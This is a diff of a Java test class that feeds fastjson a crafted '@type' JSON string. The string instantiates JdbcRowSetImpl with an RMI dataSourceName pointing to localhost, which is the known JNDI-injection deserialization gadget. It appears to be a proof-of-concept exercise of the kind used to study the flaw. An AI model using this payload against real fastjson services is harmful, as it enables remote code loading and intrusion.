@@ -13,6 +13,7 @@ public class TestJdbcRowSetImpl {
 //        rowSet.setDataSourceName("rmi://localhost:1999/obj");
 //        rowSet.setAutoCommit(true);
         String fastSer =  "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
-        JSON.parse(fastSer);
+        JSON.parseObject(fastSer);
+//        JSON.parseObject(fastSer, com.sun.rowset.JdbcRowSetImpl.class);
     }
 }
